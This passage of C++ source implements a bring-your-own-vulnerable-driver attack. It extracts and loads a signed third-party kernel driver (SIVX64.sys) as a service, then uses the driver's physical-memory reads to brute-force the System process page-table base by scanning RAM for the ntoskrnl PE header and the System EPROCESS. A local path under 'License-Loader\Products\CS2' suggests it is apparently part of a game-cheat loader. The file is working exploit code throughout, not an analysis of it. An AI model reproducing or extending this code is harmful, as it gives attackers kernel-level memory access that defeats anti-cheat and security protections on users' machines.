                                            if (ReadPhysical(ntPA, &magic, 2) && magic == 0x5A4D)
                                            {
                                                m_systemDTB = dtb;
                                                printf("[BYOVD] *** System DTB: 0x%llX (dynamic+MZ, PID=0x%X Name=0x%X) ***\n",
                                                    dtb, pidCandidate, nameOff);
                                                return true;
                                            }
                                        }
                                    }

                                    // Validation failed — do NOT blindly accept
                                    printf("[BYOVD]   DTB 0x%llX at +0x%X: no validation passed\n", dtb, dtbOff);
                                }
                                // All DTB offsets returned 0 — try next PID candidate
                                break;
                            }
                        }
                        break; // Only process first PID match per page
                    }
                }
                printf("[BYOVD] Dynamic search: %d PID hits, no System match\n", dynamicHits);
            }

            printf("[BYOVD] Targeted scan: no match found across %llu GB\n", maxScan >> 30);
            return false;
        }

        // Brute-force DTB scan: try physical pages as candidate CR3 values,
        // validate by checking if they map ntoskrnl's known VA to a valid PE header.
        // Falls back to EPROCESS-based validation if kernel code pages are EPT-protected.
        bool FindSystemDTB_BruteForce(uint64_t eprocessVA = 0)
        {
            LPVOID drivers[1024];
            DWORD needed = 0;
            if (!EnumDeviceDrivers(drivers, sizeof(drivers), &needed) || needed == 0)
            {
                printf("[BYOVD] EnumDeviceDrivers failed\n");
                return false;
            }
            uint64_t ntBase = reinterpret_cast<uint64_t>(drivers[0]);
            printf("[BYOVD] ntoskrnl VA: 0x%llX\n", ntBase);

            if (ntBase < 0xFFFF000000000000ULL)
            {
                printf("[BYOVD] ntoskrnl VA looks wrong, aborting brute-force\n");
                return false;
            }

            uint64_t pml4Idx = (ntBase >> 39) & 0x1FF;
            uint64_t pdptIdx = (ntBase >> 30) & 0x1FF;
            uint64_t pdIdx   = (ntBase >> 21) & 0x1FF;
            printf("[BYOVD] VA indices: PML4=%llu PDPT=%llu PD=%llu\n", pml4Idx, pdptIdx, pdIdx);

            // Scan full physical RAM (system DTB may be above 4GB on VBS systems)
            uint64_t MAX_SCAN = m_ramRanges.empty() ? 0x100000000ULL : m_ramRanges.back().end;
            constexpr uint64_t STEP = 0x1000;
            int candidates = 0;
            int hugePageHits = 0;

            for (uint64_t dtbCandidate = 0x1000; dtbCandidate < MAX_SCAN; dtbCandidate += STEP)
            {
                // Skip MMIO gaps
                uint64_t safe = NextSafeAddress(dtbCandidate);
                if (safe == UINT64_MAX) break;
                if (safe > dtbCandidate) { dtbCandidate = safe & ~0xFFFULL; if (dtbCandidate >= MAX_SCAN) break; }

                if ((dtbCandidate & 0x7FFFFFF) == 0)
                {
                    printf("[BYOVD]   DTB-scan 0x%llX / 0x%llX (%d cand, %d huge, IOCTLs: %llu)...\n",
                        dtbCandidate, MAX_SCAN, candidates, hugePageHits, m_ioctlCount);
                    fflush(stdout);
                }

                // Step 1: Read PML4 entry for ntoskrnl's index
                uint64_t pml4e = 0;
                if (!ReadPhysical(dtbCandidate + pml4Idx * 8, &pml4e, 8))
                    continue;
                if (!(pml4e & SIVPage::PRESENT))
                    continue;
                uint64_t pfn = pml4e & SIVPage::PFN_MASK;
                if (pfn == 0 || pfn >= 0x1000000000ULL)
                    continue;

                // Step 2: Structural check — kernel-half PML4 entries
                uint64_t kernEntries[16] = {};
                if (!ReadPhysical(dtbCandidate + 256 * 8, kernEntries, sizeof(kernEntries)))
                    continue;
                int kernPresent = 0;
                bool badPfn = false;
                for (int i = 0; i < 16; i++)
                {
                    if (kernEntries[i] & SIVPage::PRESENT)
                    {
                        kernPresent++;
                        uint64_t kpfn = kernEntries[i] & SIVPage::PFN_MASK;
                        if (kpfn == 0 || kpfn >= 0x1000000000ULL) { badPfn = true; break; }
                    }
                }
                if (badPfn || kernPresent < 2)
                    continue;

                // Step 3: User-half mostly empty for system DTB
                uint64_t userEntries[16] = {};
                if (!ReadPhysical(dtbCandidate, userEntries, sizeof(userEntries)))
                    continue;
                int userPresent = 0;
                for (int i = 0; i < 16; i++)
                    if (userEntries[i] & SIVPage::PRESENT) userPresent++;
                if (userPresent > 4)
                    continue;

                // Step 4: Read PDPT entry
                uint64_t pdpte = 0;
                if (!ReadPhysical(pfn + pdptIdx * 8, &pdpte, 8))
                    continue;
                if (!(pdpte & SIVPage::PRESENT))
                    continue;

                // Step 5: Compute PA — branch on 1GB huge vs normal pages
                uint64_t pa = 0;
                bool is1GB = (pdpte & SIVPage::LARGE) != 0;

                if (is1GB)
                {
                    // 1GB huge page: PA = (PDPTE & 1GB-PFN-mask) + (VA & 0x3FFFFFFF)
                    pa = (pdpte & 0x000FFFFFC0000000ULL) + (ntBase & (SIVPage::SIZE_1GB - 1));
                    hugePageHits++;
                }
                else
                {
                    uint64_t pdptPfn = pdpte & SIVPage::PFN_MASK;
                    if (pdptPfn == 0 || pdptPfn >= 0x1000000000ULL)
                        continue;
                    pa = TranslateVA(dtbCandidate, ntBase);
                }

                if (pa == 0 || pa >= 0x1000000000ULL)
                    continue;
                if (!IsPhysicalAddressSafe(pa, 2))
                    continue;

                candidates++;
                if (candidates <= 20)
                    printf("[BYOVD]   cand#%d DTB=0x%llX PA=0x%llX kern=%d user=%d %s\n",
                        candidates, dtbCandidate, pa, kernPresent, userPresent,
                        is1GB ? "(1GB page)" : "");

                // Validate: read MZ at computed PA
                uint16_t magic = 0;
                if (!ReadPhysical(pa, &magic, 2))
                    continue;

                if (magic == 0x5A4D)
                {
                    IMAGE_DOS_HEADER dosHdr{};
                    if (ReadPhysical(pa, &dosHdr, sizeof(dosHdr)) && dosHdr.e_lfanew > 0 && dosHdr.e_lfanew < 0x1000)
                    {
                        uint64_t pePA = is1GB
                            ? (pa + dosHdr.e_lfanew)
                            : TranslateVA(dtbCandidate, ntBase + dosHdr.e_lfanew);
                        if (pePA && pePA < 0x1000000000ULL)
                        {
                            uint32_t peSig = 0;
                            if (ReadPhysical(pePA, &peSig, 4) && peSig == 0x00004550)
                            {
                                m_systemDTB = dtbCandidate;
                                printf("[BYOVD] *** DTB found: 0x%llX (verified MZ+PE%s) ***\n",
                                       dtbCandidate, is1GB ? ", 1GB page" : "");
                                return true;
                            }
                        }
                    }
                    printf("[BYOVD]   DTB 0x%llX: MZ ok but PE verify failed%s\n",
                        dtbCandidate, is1GB ? " (1GB)" : "");
                }
                else if (candidates <= 5)
                {
                    printf("[BYOVD]   DTB 0x%llX: PA=0x%llX magic=0x%04X (not MZ)%s\n",
                        dtbCandidate, pa, magic, is1GB ? " (1GB)" : "");
                }

                // Fallback: EPROCESS-based validation (offset-agnostic scan)
                if (eprocessVA)
                {
                    uint64_t eprocPA = TranslateVA(dtbCandidate, eprocessVA);
                    if (candidates <= 5)
                        printf("[BYOVD]   EPROCESS VA 0x%llX -> PA 0x%llX via DTB 0x%llX\n",
                            eprocessVA, eprocPA, dtbCandidate);
                    uint64_t maxPhys = m_ramRanges.empty() ? 0x800000000ULL : m_ramRanges.back().end;
                    if (eprocPA > 0 && eprocPA < maxPhys && IsPhysicalAddressSafe(eprocPA, 0x100))
                    {
                        // Read ~3KB of EPROCESS data — covers all known offset ranges
                        uint8_t epData[0xC00] = {};
                        uint32_t readBytes = 0;
                        for (uint32_t off = 0; off < 0xC00; off += 4)
                        {
                            if (ReadPhysical(eprocPA + off, epData + off, 4))
                                readBytes += 4;
                            else break;
                        }
                        // Search for PID=4 (DWORD=4 followed by DWORD=0) in typical range
                        int pidPos = -1;
                        for (uint32_t i = 0x400; i + 8 <= readBytes; i += 4)
                        {
                            if (*(uint32_t*)(epData + i) == 4 && *(uint32_t*)(epData + i + 4) == 0)
                            { pidPos = (int)i; break; }
                        }
                        // Search for "System\0" in typical range
                        int namePos = -1;
                        for (uint32_t i = 0x400; i + 7 <= readBytes; i++)
                        {
                            if (memcmp(epData + i, "System\0", 7) == 0)
                            { namePos = (int)i; break; }
                        }
                        if (candidates <= 5)
                            printf("[BYOVD]   EPROCESS data: %u bytes, PID@0x%X Name@0x%X\n",
                                readBytes, pidPos, namePos);
                        if (pidPos >= 0 && namePos >= 0 && namePos > pidPos)
                        {
                            m_systemDTB = dtbCandidate;
                            printf("[BYOVD] *** DTB found: 0x%llX (EPROCESS @ PA 0x%llX, PID@+0x%X Name@+0x%X%s) ***\n",
                                dtbCandidate, eprocPA, pidPos, namePos, is1GB ? ", 1GB" : "");
                            return true;
                        }
                    }
                    else if (candidates <= 5 && eprocPA != 0)
                    {
                        printf("[BYOVD]   EPROCESS PA 0x%llX: outside safe range or translate failed\n", eprocPA);
                    }
                }
            }

            printf("[BYOVD] Brute-force DTB: %d candidates (%d via 1GB pages), none validated\n",
                   candidates, hugePageHits);
            return false;
        }

        // Scan physical memory for the System EPROCESS (PID 4, name "System"),
        // then read DTB from KPROCESS.DirectoryTableBase at offset 0x028.
        // More reliable than page table guessing since EPROCESS has strong signatures.
        bool FindSystemDTB_EPROCESS()
        {
            // Get ntoskrnl base for reference
            LPVOID drivers[1024];
            DWORD needed = 0;
            if (!EnumDeviceDrivers(drivers, sizeof(drivers), &needed) || needed == 0)
                return false;
            uint64_t ntBase = reinterpret_cast<uint64_t>(drivers[0]);

            // EPROCESS offsets for Win11 24H2/25H2
            constexpr uint32_t OFF_DTB   = 0x028;
            constexpr uint32_t OFF_PID   = 0x440;
            constexpr uint32_t OFF_LINKS = 0x448;
            constexpr uint32_t OFF_NAME  = 0x5A8;

            // ---- Phase 1: Quick scan for ntoskrnl PE header in physical memory ----
            // ntoskrnl is mapped with 2MB large pages; scan 2MB-aligned PAs first,
            // then fall back to 4KB alignment if needed.
            printf("[BYOVD] Phase1: scanning for ntoskrnl PE header (IOCTLs so far: %llu)...\n", m_ioctlCount);
            fflush(stdout);
            uint64_t ntPhysBase = 0;

            // First try 2MB-aligned (most likely, fast)
            // Use safe ranges to skip MMIO gaps efficiently
            // Only scan first 1GB — ntoskrnl is mapped in low physical memory
            for (uint64_t pa = 0x200000; pa < 0x40000000ULL; pa += 0x200000)
            {
                // Jump to next safe address if we're in an unsafe gap
                uint64_t safe = NextSafeAddress(pa);
                if (safe == UINT64_MAX || safe >= 0x40000000ULL) break;
                if (safe > pa) { pa = (safe + 0x1FFFFF) & ~0x1FFFFFULL; pa -= 0x200000; continue; }

                uint16_t magic = 0;
                if (!ReadPhysical(pa, &magic, 2)) continue;
                if (magic != 0x5A4D) continue;

                // Read DOS header for e_lfanew
                IMAGE_DOS_HEADER dos{};
                if (!ReadPhysical(pa, &dos, sizeof(dos))) continue;
                if (dos.e_lfanew <= 0 || dos.e_lfanew >= 0x1000) continue;

                // Read PE signature
                uint32_t peSig = 0;
                if (!ReadPhysical(pa + dos.e_lfanew, &peSig, 4)) continue;
                if (peSig != 0x00004550) continue;

                // Read enough of OptionalHeader to get SizeOfImage
                uint32_t sizeOfImage = 0;
                if (!ReadPhysical(pa + dos.e_lfanew + 0x50, &sizeOfImage, 4)) continue;

                // ntoskrnl is typically 10-15 MB
                if (sizeOfImage >= 0x800000 && sizeOfImage <= 0x2000000)
                {
                    printf("[BYOVD]   PE @ PA 0x%llX: SizeOfImage=0x%X (%u KB)\n",
                        pa, sizeOfImage, sizeOfImage / 1024);
                    ntPhysBase = pa;
                    break; // Take first match — ntoskrnl is loaded first
                }
            }

            if (!ntPhysBase)
            {
                printf("[BYOVD]   No ntoskrnl-sized PE found at 2MB alignment\n");
                fflush(stdout);
                // 4KB scan removed — too IOCTL-intensive (~250K calls) and ntoskrnl uses
                // 2MB large pages so physical mapping is non-contiguous anyway.
                // Fall straight through to brute EPROCESS scan.
            }

            if (!ntPhysBase)
            {
                printf("[BYOVD] Phase1: ntoskrnl PE not found in physical memory\n");
                return FindSystemDTB_EPROCESS_BruteScan(ntBase);
            }

            // ---- Phase 2: Parse export table to find PsInitialSystemProcess ----
            // We assume ntoskrnl is mapped contiguously within each 2MB large page.
            // The export directory and PsInitialSystemProcess global are typically
            // within the first few MB of the image.

            printf("[BYOVD] Phase2: parsing ntoskrnl exports at PA 0x%llX...\n", ntPhysBase);

            IMAGE_DOS_HEADER dos{};
            ReadPhysical(ntPhysBase, &dos, sizeof(dos));

            // Read PE headers
            IMAGE_NT_HEADERS64 nth{};
            if (!ReadPhysical(ntPhysBase + dos.e_lfanew, &nth, sizeof(nth)))
            {
                printf("[BYOVD]   Failed to read NT headers\n");
                return FindSystemDTB_EPROCESS_BruteScan(ntBase);
            }

            // Export directory RVA
            auto& expDir = nth.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
            if (expDir.VirtualAddress == 0 || expDir.Size == 0)
            {
                printf("[BYOVD]   No export directory\n");
                return FindSystemDTB_EPROCESS_BruteScan(ntBase);
            }

            uint64_t expPA = ntPhysBase + expDir.VirtualAddress;
            printf("[BYOVD]   Export dir RVA=0x%X PA=0x%llX\n", expDir.VirtualAddress, expPA);

            // Read IMAGE_EXPORT_DIRECTORY (40 bytes)
            IMAGE_EXPORT_DIRECTORY expd{};
            if (!ReadPhysical(expPA, &expd, sizeof(expd)))
            {
                printf("[BYOVD]   Failed to read export directory\n");
                return FindSystemDTB_EPROCESS_BruteScan(ntBase);
            }

            printf("[BYOVD]   Exports: %u functions, %u names\n",
                expd.NumberOfFunctions, expd.NumberOfNames);

            // Search export names for "PsInitialSystemProcess"
            // Names are sorted, so we could binary search, but linear is fine for diagnostics
            uint64_t namesPA = ntPhysBase + expd.AddressOfNames;
            uint64_t ordinalsPA = ntPhysBase + expd.AddressOfNameOrdinals;
            uint64_t funcsPA = ntPhysBase + expd.AddressOfFunctions;

            uint32_t psInitRVA = 0;
            for (uint32_t i = 0; i < expd.NumberOfNames && i < 20000; i++)
            {
                // Read name RVA (4 bytes)
                uint32_t nameRVA = 0;
                if (!ReadPhysical(namesPA + i * 4, &nameRVA, 4)) continue;

                // Read first 24 bytes of name
                char name[32] = {};
                if (!ReadPhysical(ntPhysBase + nameRVA, name, 24)) continue;
                name[31] = 0;

                if (strcmp(name, "PsInitialSystemProcess") == 0)
                {
                    // Get ordinal
                    uint16_t ordinal = 0;
                    ReadPhysical(ordinalsPA + i * 2, &ordinal, 2);
                    // Get function RVA
                    ReadPhysical(funcsPA + ordinal * 4, &psInitRVA, 4);
                    printf("[BYOVD]   PsInitialSystemProcess: nameIdx=%u ord=%u RVA=0x%X\n",
                        i, ordinal, psInitRVA);
                    break;
                }
            }

            if (psInitRVA == 0)
            {
                printf("[BYOVD]   PsInitialSystemProcess not found in exports\n");
                return FindSystemDTB_EPROCESS_BruteScan(ntBase);
            }

            // ---- Phase 3: Read PsInitialSystemProcess pointer ----
            // This is a global variable containing the EPROCESS VA of the System process.
            // If the RVA is within the same 2MB region as the PE header, the PA is contiguous.
            uint64_t psInitPA = ntPhysBase + psInitRVA;
            printf("[BYOVD]   PsInitialSystemProcess PA = 0x%llX\n", psInitPA);

            uint64_t systemEprocVA = 0;
            if (!ReadPhysical(psInitPA, &systemEprocVA, 8))
            {
                printf("[BYOVD]   Failed to read PsInitialSystemProcess value\n");
                return FindSystemDTB_EPROCESS_BruteScan(ntBase);
            }
            printf("[BYOVD]   System EPROCESS VA = 0x%llX\n", systemEprocVA);

            // Validate: must be a kernel address
            if ((systemEprocVA & 0xFFFF000000000000ULL) != 0xFFFF000000000000ULL)
            {
                printf("[BYOVD]   Invalid EPROCESS VA (not kernel space) — contiguity assumption may be wrong\n");
                return FindSystemDTB_EPROCESS_BruteScan(ntBase);
            }

            // ---- Phase 4: Compute actual VA-to-RVA delta and find DTB ----
            // We know ntoskrnl kernel VA (from EnumDeviceDrivers) and physical base.
            // PsInitialSystemProcess is a global in ntoskrnl's .data section.
            // Its VA = ntBase + psInitRVA. Reading from ntPhysBase + psInitRVA ONLY works
            // if the .data section is in the same contiguous physical mapping.
            //
            // Regardless, we now have the System EPROCESS VA. We need to find it
            // in physical memory. The EPROCESS is ~0xB80 bytes. Search for a page
            // that has: matching ActiveProcessLinks Flink (kernel pointer), PID=4 at
            // the expected intra-EPROCESS offset, name="System".
            //
            // We KNOW the VA, so the page offset = systemEprocVA & 0xFFF.
            // This gives us the EXACT page offset to search for PID/Name/DTB.

            uint32_t eprocPageOff = static_cast<uint32_t>(systemEprocVA & 0xFFF);
            printf("[BYOVD]   EPROCESS page offset = 0x%X\n", eprocPageOff);

            // Check if PID and Name fields fit in this page
            uint32_t pidPageOff  = eprocPageOff + OFF_PID;
            uint32_t namePageOff = eprocPageOff + OFF_NAME;
            uint32_t dtbPageOff  = eprocPageOff + OFF_DTB;
            uint32_t linkPageOff = eprocPageOff + OFF_LINKS;

            if (namePageOff + 16 > 0x1000)
            {
                printf("[BYOVD]   Name field crosses page boundary, falling back to brute scan\n");
                return FindSystemDTB_EPROCESS_BruteScan(ntBase);
            }

            // ---- Phase 5: Physical memory scan with exact offset ----
            // Search within known-safe RAM ranges only (avoids MMIO BSOD)
            printf("[BYOVD] Phase5: scanning for System EPROCESS (page offset 0x%X, IOCTLs: %llu)...\n", eprocPageOff, m_ioctlCount);
            fflush(stdout);

            int pid4Hits = 0;
            uint64_t scanLimit = 0x80000000ULL; // 2 GB default
            if (!m_ramRanges.empty())
                scanLimit = m_ramRanges.back().end; // cover all physical RAM

            for (uint64_t pg = 0; pg < scanLimit; pg += 0x1000)
            {
                // Skip to next safe RAM region if we're in a gap
                uint64_t safe = NextSafeAddress(pg);
                if (safe == UINT64_MAX) break;
                if (safe > pg) { pg = safe & ~0xFFFULL; if (pg >= scanLimit) break; }

                if ((pg & 0x3FFFFFF) == 0 && pg > 0)
                {
                    printf("[BYOVD]   scan: %llu MB (%llu IOCTLs)\n", pg >> 20, m_ioctlCount);
                    fflush(stdout);
                }

                // Quick filter: check PID first (most pages won't have value 4 at this offset)
                if (pidPageOff + 8 > 0x1000) continue;
                uint64_t pidVal = 0;
                if (!ReadPhysical(pg + pidPageOff, &pidVal, 8)) continue;
                if (pidVal != 4) continue;

                pid4Hits++;

                // Verify name
                char name[16] = {};
                if (!ReadPhysical(pg + namePageOff, name, 15)) continue;
                name[15] = 0;

                if (pid4Hits <= 5)
                    printf("[BYOVD]     PID=4 @ PA 0x%llX name='%s'\n", pg, name);

                if (strcmp(name, "System") != 0)
                    continue;

                // Read DTB
                uint64_t dtb = 0;
                ReadPhysical(pg + dtbPageOff, &dtb, 8);
                uint64_t flink = 0;
                ReadPhysical(pg + linkPageOff, &flink, 8);

                printf("[BYOVD]   EPROCESS @ PA 0x%llX: PID=4 Name='System' DTB=0x%llX Flink=0x%llX\n",
                    pg, dtb, flink);

                dtb &= ~0xFFFULL;
                if (dtb == 0)
                {
                    printf("[BYOVD]     DTB is zero, skipping\n");
                    continue;
                }

                m_systemDTB = dtb;
                printf("[BYOVD] *** System DTB: 0x%llX (EPROCESS @ PA 0x%llX) ***\n", dtb, pg);
                return true;
            }

            printf("[BYOVD] Phase5: %d PID=4 hits, no System EPROCESS found\n", pid4Hits);
            return false;
        }

        // Brute-force EPROCESS scan: try ALL page offsets at 0x10 alignment
        // This is the slowest fallback — checks every possible alignment.
        bool FindSystemDTB_EPROCESS_BruteScan(uint64_t ntBase)
        {
            constexpr uint32_t OFF_DTB   = 0x028;

            // Multiple PID-to-Name deltas to handle different Windows builds
            struct { uint32_t pidOff; uint32_t nameOff; } deltas[] = {
                { 0x4C0, 0x610 }, { 0x480, 0x5D0 },
                { 0x440, 0x5A8 }, { 0x440, 0x5B0 }, { 0x448, 0x5B0 },
                { 0x448, 0x5B8 }, { 0x440, 0x5E8 }, { 0x480, 0x5E8 },
                { 0x440, 0x5C0 }, { 0x448, 0x5E8 },
            };
            constexpr int NUM_DELTAS = sizeof(deltas) / sizeof(deltas[0]);

            printf("[BYOVD] Brute EPROCESS scan: trying %d offset sets across all RAM (IOCTLs: %llu)...\n", NUM_DELTAS, m_ioctlCount);
            fflush(stdout);

            int pid4Hits = 0;
            uint64_t MAX_SCAN = 0x40000000ULL; // 1 GB default
            if (!m_ramRanges.empty())
                MAX_SCAN = m_ramRanges.back().end; // cover all physical RAM

            for (uint64_t pa = 0; pa < MAX_SCAN; pa += 0x1000)
            {
                // Skip to next safe RAM region
                uint64_t safe = NextSafeAddress(pa);
                if (safe == UINT64_MAX) break;
                if (safe > pa) { pa = safe & ~0xFFFULL; if (pa >= MAX_SCAN) break; }

                if ((pa & 0x3FFFFFF) == 0 && pa > 0)
                {
                    printf("[BYOVD]   brute: %llu MB / %llu MB (%d hits, %llu IOCTLs)\n",
                        pa >> 20, MAX_SCAN >> 20, pid4Hits, m_ioctlCount);
                    fflush(stdout);
                }

                // Try each delta set
                for (int di = 0; di < NUM_DELTAS; di++)
                {
                    uint32_t pidOff = deltas[di].pidOff;
                    uint32_t nmOff  = deltas[di].nameOff;

                    // PID can be at page offsets pidOff to (0x1000 - 8)
                    // Simple: just check one offset per delta (EPROCESS at page offset 0)
                    if (pidOff + 8 > 0x1000) continue;

                    uint64_t pid = 0;
                    if (!ReadPhysical(pa + pidOff, &pid, 8)) continue;
                    if (pid != 4) continue;

                    pid4Hits++;

                    // Check name at computed offset
                    if (nmOff + 15 > 0x1000) continue;

                    char name[16] = {};
                    if (!ReadPhysical(pa + nmOff, name, 15)) continue;
                    name[15] = 0;

                    if (pid4Hits <= 10)
                        printf("[BYOVD]     PID=4 @ PA 0x%llX+0x%X name='%s' (delta %d)\n", pa, pidOff, name, di);

                    if (strcmp(name, "System") != 0) continue;

                    // Found! Read DTB (always KPROCESS+0x028)
                    uint64_t dtb = 0;
                    ReadPhysical(pa + OFF_DTB, &dtb, 8);

                    printf("[BYOVD]   EPROCESS @ PA 0x%llX: PID=0x%X Name=0x%X DTB=0x%llX (delta %d)\n",
                        pa, pidOff, nmOff, dtb, di);

                    dtb &= ~0xFFFULL;
                    if (dtb == 0) continue;

                    m_systemDTB = dtb;
                    printf("[BYOVD] *** System DTB: 0x%llX (EPROCESS @ PA 0x%llX) ***\n", dtb, pa);
                    return true;
                }
            }

            printf("[BYOVD] Brute EPROCESS scan: %d PID=4 hits, none matched System\n", pid4Hits);
            return false;
        }

        // ---- Driver loading via SCM ----

        bool LoadDriver()
        {
            wchar_t drvPath[MAX_PATH];
            GetTempPathW(MAX_PATH, drvPath);
            wcscat_s(drvPath, L"SIVX64.sys");

            // Try embedded resource first (ID 105 = SIVX64.sys)
            bool extracted = false;
            HRSRC hRes = FindResourceW(nullptr, MAKEINTRESOURCEW(105), MAKEINTRESOURCEW(10));
            if (!hRes) // fallback: try as MAKEINTRESOURCEW(10)
                hRes = FindResourceW(nullptr, MAKEINTRESOURCEW(105), MAKEINTRESOURCEW(10));
            printf("[BYOVD] FindResource(105): %s\n", hRes ? "found" : "not found");
            if (hRes)
            {
                HGLOBAL hData = LoadResource(nullptr, hRes);
                DWORD sz = SizeofResource(nullptr, hRes);
                auto* ptr = static_cast<const BYTE*>(LockResource(hData));
                printf("[BYOVD] Resource: ptr=%p size=%lu\n", ptr, sz);
                if (ptr && sz)
                {
                    HANDLE hf = CreateFileW(drvPath, GENERIC_WRITE, 0, nullptr,
                                            CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
                    if (hf != INVALID_HANDLE_VALUE)
                    {
                        DWORD wr = 0;
                        WriteFile(hf, ptr, sz, &wr, nullptr);
                        CloseHandle(hf);
                        extracted = (wr == sz);
                    }
                }
            }

            if (!extracted)
            {
                // Look for SIVX64.sys next to the exe AND in parent directory
                wchar_t selfDir[MAX_PATH];
                GetModuleFileNameW(nullptr, selfDir, MAX_PATH);
                wchar_t* sl = wcsrchr(selfDir, L'\\');
                if (sl) *(sl + 1) = L'\0';

                wchar_t candidates[3][MAX_PATH] = {};
                wcscpy_s(candidates[0], selfDir);
                wcscat_s(candidates[0], L"SIVX64.sys");

                wcscpy_s(candidates[1], selfDir);
                wcscat_s(candidates[1], L"..\\SIVX64.sys");

                // Also check project root directly
                wcscpy_s(candidates[2], L"c:\\Users\\Samuel\\License-Loader\\Loader\\Products\\CS2\\SIVX64.sys");

                for (auto& cand : candidates)
                {
                    if (GetFileAttributesW(cand) != INVALID_FILE_ATTRIBUTES)
                    {
                        CopyFileW(cand, drvPath, FALSE);
                        extracted = true;
                        printf("[BYOVD] Found SIVX64.sys at: %ls\n", cand);
                        break;
                    }
                }

                if (!extracted)
                {
                    printf("[BYOVD] SIVX64.sys not available (no resource, no file)\n");
                    return false;
                }
            }

            SC_HANDLE scm = OpenSCManagerW(nullptr, nullptr, SC_MANAGER_CREATE_SERVICE);
            if (!scm)
            {
                printf("[BYOVD] OpenSCManager failed (run as Admin)\n");
                return false;
            }

            SC_HANDLE existing = OpenServiceW(scm, SVC_NAME, SERVICE_ALL_ACCESS);
            if (existing)
            {
                SERVICE_STATUS ss;
                ControlService(existing, SERVICE_CONTROL_STOP, &ss);
                DeleteService(existing);
                CloseServiceHandle(existing);
                Sleep(1000);
            }

            SC_HANDLE svc = CreateServiceW(
                scm, SVC_NAME, SVC_NAME,
                SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER,
                SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE,
                drvPath, nullptr, nullptr, nullptr, nullptr, nullptr);

            if (!svc)
            {
                DWORD err = GetLastError();
                if (err == ERROR_SERVICE_MARKED_FOR_DELETE)
                {
                    printf("[BYOVD] Service marked for delete — waiting...\n");
                    for (int retries = 0; retries < 40; ++retries)
                    {
                        Sleep(250);
                        svc = CreateServiceW(
                            scm, SVC_NAME, SVC_NAME,
                            SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER,
                            SERVICE_DEMAND_START, SERVICE_ERROR_IGNORE,
                            drvPath, nullptr, nullptr, nullptr, nullptr, nullptr);
                        if (svc) break;
                        err = GetLastError();
                        if (err == ERROR_SERVICE_EXISTS)
                        {
                            svc = OpenServiceW(scm, SVC_NAME, SERVICE_ALL_ACCESS);
                            break;
                        }
                        if (err != ERROR_SERVICE_MARKED_FOR_DELETE) break;
                    }
                }
                else if (err == ERROR_SERVICE_EXISTS)
                {
                    svc = OpenServiceW(scm, SVC_NAME, SERVICE_ALL_ACCESS);
                }

                if (!svc)
                {
                    printf("[BYOVD] CreateService failed: 0x%lX\n", GetLastError());
                    CloseServiceHandle(scm);
                    return false;
                }
            }

            if (!StartServiceW(svc, 0, nullptr))
            {
                DWORD err = GetLastError();
                if (err != ERROR_SERVICE_ALREADY_RUNNING)
                {
                    printf("[BYOVD] StartService failed: 0x%lX\n", err);
                    DeleteService(svc);
                    CloseServiceHandle(svc);
                    CloseServiceHandle(scm);
                    return false;
                }
            }

            printf("[BYOVD] SIVX64.sys loaded successfully (WHQL signed)\n");
            CloseServiceHandle(svc);
            CloseServiceHandle(scm);
            return true;
        }
    };

    inline void UnloadSIVDriver()
    {
        UnloadDriverService(L"SIVDRVcs2", L"SIVX64.sys");
    }
}
